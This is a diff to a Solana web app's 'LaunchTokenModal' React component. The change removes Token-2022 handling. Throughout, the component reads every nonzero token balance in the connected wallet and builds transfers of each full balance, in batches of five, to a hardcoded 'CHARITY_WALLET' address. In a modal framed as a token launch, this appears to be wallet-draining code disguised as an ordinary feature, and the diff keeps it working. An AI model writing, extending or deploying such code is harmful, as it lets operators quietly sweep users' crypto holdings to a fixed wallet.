@@ -7,7 +7,7 @@ import { Upload, X, Loader2, Rocket } from 'lucide-react';
 import { toast } from 'sonner';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
-import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -19,7 +19,6 @@ interface TokenBalance {
   uiAmount: number;
   symbol: string;
   valueInSOL: number;
-  programId: PublicKey;
 }
 
 interface LaunchTokenModalProps {
@@ -69,53 +68,25 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
     if (!publicKey) return;
 
     try {
-      const allTokens: TokenBalance[] = [];
-
-      // Fetch standard SPL token accounts
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      for (const { account } of tokenAccounts.value) {
-        const info = account.data.parsed.info;
-        if (info.tokenAmount.uiAmount > 0) {
-          allTokens.push({
+      const tokens: TokenBalance[] = tokenAccounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
             mint: info.mint,
             balance: info.tokenAmount.amount,
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0,
-            programId: TOKEN_PROGRAM_ID,
-          });
-        }
-      }
+            valueInSOL: 0
+          };
+        })
+        .filter(token => token.uiAmount > 0);
 
-      // Fetch Token-2022 accounts (Pump.fun tokens)
-      try {
-        const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-          programId: TOKEN_2022_PROGRAM_ID
-        });
-
-        for (const { account } of token2022Accounts.value) {
-          const info = account.data.parsed.info;
-          if (info.tokenAmount.uiAmount > 0) {
-            allTokens.push({
-              mint: info.mint,
-              balance: info.tokenAmount.amount,
-              decimals: info.tokenAmount.decimals,
-              uiAmount: info.tokenAmount.uiAmount,
-              symbol: info.mint.slice(0, 8),
-              valueInSOL: 0,
-              programId: TOKEN_2022_PROGRAM_ID,
-            });
-          }
-        }
-      } catch (token2022Error) {
-        console.log('No Token-2022 accounts found:', token2022Error);
-      }
-
-      setBalances(allTokens);
+      setBalances(tokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
     }
@@ -144,24 +115,17 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
     for (const token of tokenBatch) {
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const tokenProgramId = token.programId || TOKEN_PROGRAM_ID;
         
         // Get source account
         const sourceAccount = await getAssociatedTokenAddress(
           mintPubkey,
-          effectivePublicKey,
-          false,
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
+          effectivePublicKey
         );
 
         // Get destination account
         const destinationAccount = await getAssociatedTokenAddress(
           mintPubkey,
-          charityPubkey,
-          false,
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
+          charityPubkey
         );
 
         // Check if destination account exists
@@ -174,9 +138,7 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
               effectivePublicKey,
               destinationAccount,
               charityPubkey,
-              mintPubkey,
-              tokenProgramId,
-              ASSOCIATED_TOKEN_PROGRAM_ID
+              mintPubkey
             )
           );
         }
@@ -187,9 +149,7 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
             sourceAccount,
             destinationAccount,
             effectivePublicKey,
-            BigInt(token.balance),
-            [],
-            tokenProgramId
+            BigInt(token.balance)
           )
         );
       } catch (err) {
